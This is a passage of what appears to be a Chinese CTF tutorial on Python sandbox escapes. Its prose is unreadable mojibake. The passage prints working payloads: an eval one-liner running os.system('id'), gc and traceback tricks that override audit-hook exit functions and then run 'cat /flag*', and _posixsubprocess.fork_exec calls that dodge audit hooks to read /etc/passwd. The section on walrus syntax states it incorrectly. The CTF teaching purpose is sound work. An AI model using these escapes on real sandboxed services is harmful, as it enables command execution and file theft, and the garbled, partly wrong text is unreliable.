æ¨¡å¼ä¸‹ä¹ŸåŒæ ·å¯ä»¥ä½¿ç”¨ \n è¿›è¡Œæ¢è¡Œï¼Œåœ¨ exec æ¨¡å¼ä¸‹å¯ä»¥ç›´æ¥æ‰§è¡Œå¤šè¡Œä»£ç .</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;&#x27;&#x27;eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h4 id="æµ·è±¡è¡¨è¾¾å¼"><a class="markdownIt-Anchor" href="#æµ·è±¡è¡¨è¾¾å¼">#</a> æµ·è±¡è¡¨è¾¾å¼</h4><p>æµ·è±¡è¡¨è¾¾å¼æ˜¯ Python 3.8 å¼•å…¥çš„ä¸€ç§æ–°çš„è¯­æ³•ç‰¹æ€§ï¼Œç”¨äºåœ¨è¡¨è¾¾å¼ä¸­åŒæ—¶è¿›è¡Œèµ‹å€¼å’Œæ¯”è¾ƒæ“ä½œã€‚</p><p>æµ·è±¡è¡¨è¾¾å¼çš„è¯­æ³•å½¢å¼å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;expression&gt; := &lt;value&gt; <span class="keyword">if</span> &lt;condition&gt; <span class="keyword">else</span> &lt;value&gt;</span><br></pre></td></tr></table></figure></div><p>å€ŸåŠ©æµ·è±¡è¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ—è¡¨æ¥æ›¿ä»£å¤šè¡Œä»£ç ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;id&quot;)]&#x27;</span>)</span><br><span class="line">uid=<span class="number">1000</span>(kali) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">20</span>(dialout),<span class="number">24</span>(cdrom),<span class="number">25</span>(floppy),<span class="number">27</span>(sudo),<span class="number">29</span>(audio),<span class="number">30</span>(dip),<span class="number">44</span>(video),<span class="number">46</span>(plugdev),<span class="number">109</span>(netdev),<span class="number">119</span>(wireshark),<span class="number">122</span>(bluetooth),<span class="number">134</span>(scanner),<span class="number">142</span>(kaboxer)</span><br><span class="line">[&lt;module <span class="string">&#x27;os&#x27;</span> (frozen)&gt;, <span class="number">0</span>]</span><br></pre></td></tr></table></figure></div><h3 id="å˜é‡è¦†ç›–ä¸å‡½æ•°ç¯¡æ”¹"><a class="markdownIt-Anchor" href="#å˜é‡è¦†ç›–ä¸å‡½æ•°ç¯¡æ”¹">#</a> å˜é‡è¦†ç›–ä¸å‡½æ•°ç¯¡æ”¹</h3><p>åœ¨ Python ä¸­ï¼Œsys æ¨¡å—æä¾›äº†è®¸å¤šä¸ Python è§£é‡Šå™¨å’Œå…¶ç¯å¢ƒäº¤äº’çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬å¯¹å…¨å±€å˜é‡å’Œå‡½æ•°çš„æ“ä½œã€‚åœ¨æ²™ç®±ä¸­è·å– sys æ¨¡å—å°±å¯ä»¥è¾¾åˆ°å˜é‡è¦†ç›–ä¸å‡½æ•°æ“¦ç¯¡æ”¹çš„ç›®çš„.</p><p>sys.modules å­˜æ”¾äº†ç°æœ‰æ¨¡å—çš„å¼•ç”¨ï¼Œé€šè¿‡è®¿é—®  <code>sys.modules['__main__']</code>  å°±å¯ä»¥è®¿é—®å½“å½“å‰æ¨¡å—å®šä¹‰çš„æ‰€æœ‰å‡½æ•°ä»¥åŠå…¨å±€å˜é‡</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>aaa = <span class="string">&#x27;bbb&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">my_input</span>():</span><br><span class="line"><span class="meta">... </span>    dict_global = <span class="built_in">dict</span>()</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="meta">... </span>      <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">... </span>          input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="meta">... </span>      <span class="keyword">except</span> EOFError:</span><br><span class="line"><span class="meta">... </span>          <span class="built_in">print</span>()</span><br><span class="line"><span class="meta">... </span>          <span class="keyword">break</span></span><br><span class="line"><span class="meta">... </span>      <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line"><span class="meta">... </span>          <span class="built_in">print</span>(<span class="string">&#x27;bye~~&#x27;</span>)</span><br><span class="line"><span class="meta">... </span>          <span class="keyword">continue</span></span><br><span class="line"><span class="meta">... </span>      <span class="keyword">if</span> input_data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line"><span class="meta">... </span>          <span class="keyword">continue</span></span><br><span class="line"><span class="meta">... </span>      <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">... </span>          complie_code = <span class="built_in">compile</span>(input_data, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line"><span class="meta">... </span>      <span class="keyword">except</span> SyntaxError <span class="keyword">as</span> err:</span><br><span class="line"><span class="meta">... </span>          <span class="built_in">print</span>(err)</span><br><span class="line"><span class="meta">... </span>          <span class="keyword">continue</span></span><br><span class="line"><span class="meta">... </span>      <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">... </span>          <span class="built_in">exec</span>(complie_code, dict_global)</span><br><span class="line"><span class="meta">... </span>      <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line"><span class="meta">... </span>          <span class="built_in">print</span>(err)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;__main__&#x27;</span>]</span><br><span class="line">&lt;module <span class="string">&#x27;__main__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>])</span><br><span class="line">[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;my_input&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;__main__&#x27;</span>].aaa</span><br><span class="line"><span class="string">&#x27;bbb&#x27;</span></span><br></pre></td></tr></table></figure></div><p>é™¤äº†é€šè¿‡ sys æ¨¡å—æ¥è·å–å½“å‰æ¨¡å—çš„å˜é‡ä»¥åŠå‡½æ•°å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡  <code>__builtins__</code> ç¯¡æ”¹å†…ç½®å‡½æ•°ç­‰ï¼Œè¿™åªæ˜¯ä¸€ä¸ªæ€è·¯.</p><p>æ€»ä½“æ¥è¯´ï¼Œåªè¦è·å–äº†æŸä¸ªå‡½æ•°æˆ–è€…å˜é‡å°±å¯ä»¥ç¯¡æ”¹ï¼Œéš¾ç‚¹å°±åœ¨äºè·å–.</p><h4 id="åˆ©ç”¨-gc-è·å–å·²åˆ é™¤æ¨¡å—"><a class="markdownIt-Anchor" href="#åˆ©ç”¨-gc-è·å–å·²åˆ é™¤æ¨¡å—">#</a> åˆ©ç”¨ gc è·å–å·²åˆ é™¤æ¨¡å—</h4><p>è¿™ä¸ªæ€è·¯æ¥æºäº <a class="link" href="https://github.com/fab1ano/hxp-ctf-20/tree/master/audited">writeup by fab1ano â€“ github <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>è¿™é“é¢˜çš„ç›®æ ‡æ˜¯è¦†ç›–  <code>__main__</code>  ä¸­çš„  <code>__exit</code>  å‡½æ•°ï¼Œä½†æ˜¯é¢˜ç›®å°†  <code>sys.modules['__main__']</code>  åˆ é™¤äº†ï¼Œæ— æ³•ç›´æ¥è·å–.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> <span class="built_in">set</span>(sys.modules.keys()):</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">in</span> sys.modules:</span><br><span class="line">        <span class="keyword">del</span> sys.modules[module]</span><br></pre></td></tr></table></figure></div><p><code>gc</code>  æ˜¯ Python çš„å†…ç½®æ¨¡å—ï¼Œå…¨åä¸º &quot;garbage collector&quot;ï¼Œä¸­æ–‡è¯‘ä¸º &quot;åƒåœ¾å›æ”¶&quot;ã€‚ <code>gc</code>  æ¨¡å—ä¸»è¦çš„åŠŸèƒ½æ˜¯æä¾›ä¸€ä¸ªæ¥å£ä¾›å¼€å‘è€…ç›´æ¥ä¸ Python çš„åƒåœ¾å›æ”¶æœºåˆ¶è¿›è¡Œäº¤äº’ã€‚</p><p>Python ä½¿ç”¨äº†å¼•ç”¨è®¡æ•°ä½œä¸ºå…¶ä¸»è¦çš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼ŒåŒæ—¶ä¹Ÿå¼•å…¥äº†å¾ªç¯åƒåœ¾å›æ”¶å™¨æ¥æ£€æµ‹å¹¶æ”¶é›†å¾ªç¯å¼•ç”¨çš„å¯¹è±¡ã€‚ <code>gc</code>  æ¨¡å—æä¾›äº†ä¸€äº›å‡½æ•°ï¼Œè®©ä½ å¯ä»¥ç›´æ¥æ§åˆ¶è¿™ä¸ªå¾ªç¯åƒåœ¾å›æ”¶å™¨ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€äº›  <code>gc</code>  æ¨¡å—ä¸­çš„ä¸»è¦å‡½æ•°ï¼š</p><ol><li><code>gc.collect(generation=2)</code> ï¼šè¿™ä¸ªå‡½æ•°ä¼šç«‹å³è§¦å‘ä¸€æ¬¡åƒåœ¾å›æ”¶ã€‚ä½ å¯ä»¥é€šè¿‡  <code>generation</code>  å‚æ•°æŒ‡å®šè¦æ”¶é›†çš„ä»£æ•°ã€‚Python çš„åƒåœ¾å›æ”¶å™¨æ˜¯åˆ†ä»£çš„ï¼Œæ–°åˆ›å»ºçš„å¯¹è±¡åœ¨ç¬¬ä¸€ä»£ï¼Œç»å†è¿‡ä¸€æ¬¡åƒåœ¾å›æ”¶åä»ç„¶å­˜æ´»çš„å¯¹è±¡ä¼šè¢«ç§»åˆ°ä¸‹ä¸€ä»£ã€‚</li><li><code>gc.get_objects()</code> ï¼šè¿™ä¸ªå‡½æ•°ä¼šè¿”å›å½“å‰è¢«ç®¡ç†çš„æ‰€æœ‰å¯¹è±¡çš„åˆ—è¡¨ã€‚</li><li><code>gc.get_referrers(*objs)</code> ï¼šè¿™ä¸ªå‡½æ•°ä¼šè¿”å›æŒ‡å‘  <code>objs</code>  ä¸­ä»»ä½•ä¸€ä¸ªå¯¹è±¡çš„å¯¹è±¡åˆ—è¡¨ã€‚</li></ol><p>exp å¦‚ä¸‹</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> gc.get_objects():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;__name__&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(obj):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;__main__&#x27;</span> <span class="keyword">in</span> obj.__name__:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found module __main__&#x27;</span>)</span><br><span class="line">            mod_main = obj</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> == obj.__name__:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found module os&#x27;</span>)</span><br><span class="line">            mod_os = obj</span><br><span class="line">mod_main.__exit = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&quot;[+] bypass&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>åœ¨ 3.11 ç‰ˆæœ¬å’Œ python 3.8.10 ç‰ˆæœ¬ä¸­æµ‹è¯•å‘ç°ä¼šè§¦å‘ gc.get_objects hook å¯¼è‡´æ— æ³•æˆåŠŸ.</p><h4 id="åˆ©ç”¨-traceback-è·å–æ¨¡å—"><a class="markdownIt-Anchor" href="#åˆ©ç”¨-traceback-è·å–æ¨¡å—">#</a> åˆ©ç”¨ traceback è·å–æ¨¡å—</h4><p>è¿™ä¸ªæ€è·¯æ¥æºäº <a class="link" href="https://github.com/hstocks/ctf_writeups/blob/master/2020/hxp/audited/README.md">writeup by hstocks â€“ github <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>ä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸ï¼Œå¹¶è·å–å…¶åè¦æ‰§è¡Œçš„ä»£ç ï¼Œç„¶åå°† <code>__exit</code>  è¿›è¡Œæ›¿æ¢ï¼Œæ€è·¯ä¹Ÿæ˜¯ååˆ†å·§å¦™.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    _, _, tb = sys.exc_info()</span><br><span class="line">    nxt_frame = tb.tb_frame</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Walk up stack frames until we find one which</span></span><br><span class="line">    <span class="comment"># has a reference to the audit function</span></span><br><span class="line">    <span class="keyword">while</span> nxt_frame:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;audit&#x27;</span> <span class="keyword">in</span> nxt_frame.f_globals:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        nxt_frame = nxt_frame.f_back</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Neuter the __exit function</span></span><br><span class="line">    nxt_frame.f_globals[<span class="string">&#x27;__exit&#x27;</span>] = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Now we&#x27;re free to call whatever we want</span></span><br><span class="line">    os.system(<span class="string">&#x27;cat /flag*&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>ä½†æ˜¯å®é™…æµ‹è¯•æ—¶ä½¿ç”¨ python 3.11 å‘ç°  <code>nxt_frame = tb.tb_frame</code>  ä¼šè§¦å‘  <code>object.__getattr__</code>  hook. ä¸åŒçš„ç‰ˆæœ¬ä¸­è§¦å‘ hook çš„åœ°æ–¹ä¼šæœ‰å·®å¼‚ï¼Œè¿™ä¸ª payload å¯èƒ½ä»…åœ¨ python 3.9 (é¢˜ç›®ç‰ˆæœ¬) ä¸­é€‚ç”¨</p><h3 id="ç»•è¿‡-audit-hook"><a class="markdownIt-Anchor" href="#ç»•è¿‡-audit-hook">#</a> ç»•è¿‡ audit hook</h3><p>Python çš„å®¡è®¡äº‹ä»¶åŒ…æ‹¬ä¸€ç³»åˆ—å¯èƒ½å½±å“åˆ° Python ç¨‹åºè¿è¡Œå®‰å…¨æ€§çš„é‡è¦æ“ä½œã€‚è¿™äº›äº‹ä»¶çš„ç§ç±»åŠåç§°ä¸åŒç‰ˆæœ¬çš„ Python è§£é‡Šå™¨æœ‰æ‰€ä¸åŒï¼Œä¸”å¯èƒ½ä¼šéšç€ Python è§£é‡Šå™¨çš„æ›´æ–°è€Œå˜åŠ¨ã€‚</p><p>Python ä¸­çš„å®¡è®¡äº‹ä»¶åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹å‡ ç±»ï¼š</p><ul><li><code>import</code> ï¼šå‘ç”Ÿåœ¨å¯¼å…¥æ¨¡å—æ—¶ã€‚</li><li><code>open</code> ï¼šå‘ç”Ÿåœ¨æ‰“å¼€æ–‡ä»¶æ—¶ã€‚</li><li><code>write</code> ï¼šå‘ç”Ÿåœ¨å†™å…¥æ–‡ä»¶æ—¶ã€‚</li><li><code>exec</code> ï¼šå‘ç”Ÿåœ¨æ‰§è¡Œ Python ä»£ç æ—¶ã€‚</li><li><code>compile</code> ï¼šå‘ç”Ÿåœ¨ç¼–è¯‘ Python ä»£ç æ—¶ã€‚</li><li><code>socket</code> ï¼šå‘ç”Ÿåœ¨åˆ›å»ºæˆ–ä½¿ç”¨ç½‘ç»œå¥—æ¥å­—æ—¶ã€‚</li><li><code>os.system</code> ï¼Œ <code>os.popen</code>  ç­‰ï¼šå‘ç”Ÿåœ¨æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤æ—¶ã€‚</li><li><code>subprocess.Popen</code> ï¼Œ <code>subprocess.run</code>  ç­‰ï¼šå‘ç”Ÿåœ¨å¯åŠ¨å­è¿›ç¨‹æ—¶ã€‚</li></ul><p>calc_jail_beginner_level6 è¿™é“é¢˜ä¸­ä½¿ç”¨äº† audithook æ„å»ºæ²™ç®±ï¼Œé‡‡ç”¨ç™½åå•æ¥è¿›è¡Œé™åˆ¶.audit hook å±äº python åº•å±‚çš„å®ç°ï¼Œå› æ­¤å¸¸è§„çš„å˜æ¢æ ¹æœ¬æ— æ³•ç»•è¿‡.</p><p>è¿™é“é¢˜éœ€è¦ç»•è¿‡çš„ç‚¹æœ‰ä¸¤ä¸ª:</p><ol><li><p>ç»•è¿‡ import å¯¼å…¥æ¨¡å—ã€‚å¦‚æœç›´æ¥ä½¿ç”¨ import, å°±ä¼šè§¦å‘ audithook</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; __import__(&#x27;ctypes&#x27;)</span><br><span class="line"> Operation not permitted: import</span><br></pre></td></tr></table></figure></div></li><li><p>ç»•è¿‡å¸¸è§„çš„å‘½ä»¤æ‰§è¡Œæ–¹æ³•æ‰§è¡Œå‘½ä»¤ã€‚åˆ©ç”¨ os, subproccess ç­‰æ¨¡å—æ‰§è¡Œå‘½ä»¤æ—¶ä¹Ÿä¼šè§¦å‘ audithook</p></li></ol><p>åœ¨ä¸Šæ–‡åˆ©ç”¨ <code>_posixsubprocess.fork.exec</code>  ç»•è¿‡ä¹‹å¤–ï¼š</p><h4 id="_posixsubprocess-æ‰§è¡Œå‘½ä»¤"><a class="markdownIt-Anchor" href="#_posixsubprocess-æ‰§è¡Œå‘½ä»¤">#</a> _posixsubprocess æ‰§è¡Œå‘½ä»¤</h4><p>_posixsubprocess æ¨¡å—æ˜¯ Python çš„å†…éƒ¨æ¨¡å—ï¼Œæä¾›äº†ä¸€ä¸ªç”¨äºåœ¨ UNIX å¹³å°ä¸Šåˆ›å»ºå­è¿›ç¨‹çš„ä½çº§åˆ«æ¥å£ã€‚subprocess æ¨¡å—çš„å®ç°å°±ç”¨åˆ°äº† _posixsubprocess.</p><p>è¯¥æ¨¡å—çš„æ ¸å¿ƒåŠŸèƒ½æ˜¯ fork_exec å‡½æ•°ï¼Œfork_exec æä¾›äº†ä¸€ä¸ªéå¸¸åº•å±‚çš„æ–¹å¼æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„å­è¿›ç¨‹ï¼Œå¹¶åœ¨è¿™ä¸ªæ–°è¿›ç¨‹ä¸­æ‰§è¡Œä¸€ä¸ªæŒ‡å®šçš„ç¨‹åºã€‚ä½†è¿™ä¸ªæ¨¡å—å¹¶æ²¡æœ‰åœ¨ Python çš„æ ‡å‡†åº“æ–‡æ¡£ä¸­åˆ—å‡ºï¼Œæ¯ä¸ªç‰ˆæœ¬çš„ Python å¯èƒ½æœ‰æ‰€å·®å¼‚.</p><p>åœ¨æˆ‘æœ¬åœ°çš„ Python 3.11 ä¸­å…·ä½“çš„å‡½æ•°å£°æ˜å¦‚ä¸‹:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fork_exec</span>(<span class="params"></span></span><br><span class="line"><span class="params">    __process_args: <span class="type">Sequence</span>[StrOrBytesPath] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __executable_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>],</span></span><br><span class="line"><span class="params">    __close_fds: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params">    __fds_to_keep: <span class="built_in">tuple</span>[<span class="built_in">int</span>, ...],</span></span><br><span class="line"><span class="params">    __cwd_obj: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    __env_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __p2cread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __p2cwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pred: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_read: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_write: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __restore_signals: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __call_setsid: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __pgid_to_set: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __gid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __groups_list: <span class="built_in">list</span>[<span class="built_in">int</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __uid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __child_umask: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __preexec_fn: <span class="type">Callable</span>[[], <span class="literal">None</span>],</span></span><br><span class="line"><span class="params">    __allow_vfork: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">int</span>: ...</span><br></pre></td></tr></table></figure></div><ul><li><code>__process_args</code> : ä¼ é€’ç»™æ–°è¿›ç¨‹çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œé€šå¸¸ä¸ºç¨‹åºè·¯å¾„åŠå…¶å‚æ•°çš„åˆ—è¡¨ã€‚</li><li><code>__executable_list</code> : å¯æ‰§è¡Œç¨‹åºè·¯å¾„çš„åˆ—è¡¨ã€‚</li><li><code>__close_fds</code> : å¦‚æœè®¾ç½®ä¸º Trueï¼Œåˆ™åœ¨æ–°è¿›ç¨‹ä¸­å…³é—­æ‰€æœ‰çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</li><li><code>__fds_to_keep</code> : ä¸€ä¸ªå…ƒç»„ï¼Œè¡¨ç¤ºåœ¨æ–°è¿›ç¨‹ä¸­éœ€è¦ä¿æŒæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦çš„åˆ—è¡¨ã€‚</li><li><code>__cwd_obj</code> : æ–°è¿›ç¨‹çš„å·¥ä½œç›®å½•ã€‚</li><li><code>__env_list</code> : ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œå®ƒæ˜¯é”®å’Œå€¼çš„åºåˆ—ï¼Œä¾‹å¦‚ï¼š[â€œPATH=/usr/binâ€, â€œHOME=/home/userâ€]ã€‚</li><li><code>__p2cread, __p2cwrite, __c2pred, __c2pwrite, __errread, __errwrite</code> : è¿™äº›æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œç”¨äºåœ¨çˆ¶å­è¿›ç¨‹é—´è¿›è¡Œé€šä¿¡ã€‚</li><li><code>__errpipe_read, __errpipe_write</code> : è¿™ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ç”¨äºçˆ¶å­è¿›ç¨‹é—´çš„é”™è¯¯é€šä¿¡ã€‚</li><li><code>__restore_signals</code> : å¦‚æœè®¾ç½®ä¸º 1ï¼Œåˆ™åœ¨æ–°åˆ›å»ºçš„å­è¿›ç¨‹ä¸­æ¢å¤é»˜è®¤çš„ä¿¡å·å¤„ç†ã€‚</li><li><code>__call_setsid</code> : å¦‚æœè®¾ç½®ä¸º 1ï¼Œåˆ™åœ¨æ–°è¿›ç¨‹ä¸­åˆ›å»ºæ–°çš„ä¼šè¯ã€‚</li><li><code>__pgid_to_set</code> : è®¾ç½®æ–°è¿›ç¨‹çš„è¿›ç¨‹ç»„ IDã€‚</li><li><code>__gid_object, __groups_list, __uid_object</code> : è¿™äº›å‚æ•°ç”¨äºè®¾ç½®æ–°è¿›ç¨‹çš„ç”¨æˆ· ID å’Œç»„ IDã€‚</li><li><code>__child_umask</code> : è®¾ç½®æ–°è¿›ç¨‹çš„ umaskã€‚</li><li><code>__preexec_fn</code> : åœ¨æ–°è¿›ç¨‹ä¸­æ‰§è¡Œçš„å‡½æ•°ï¼Œå®ƒä¼šåœ¨æ–°è¿›ç¨‹çš„ä¸»ä½“éƒ¨åˆ†æ‰§è¡Œä¹‹å‰è°ƒç”¨ã€‚</li><li><code>__allow_vfork</code> : å¦‚æœè®¾ç½®ä¸º Trueï¼Œåˆ™åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ä½¿ç”¨ vfork è€Œä¸æ˜¯ forkã€‚vfork æ˜¯ä¸€ä¸ªæ›´é«˜æ•ˆçš„ forkï¼Œä½†æ˜¯ä½¿ç”¨ vfork å¯èƒ½ä¼šæœ‰ä¸€äº›é—®é¢˜ ã€‚</li></ul><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæœ€å°åŒ–ç¤ºä¾‹:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div><p>ç»“åˆä¸Šé¢çš„  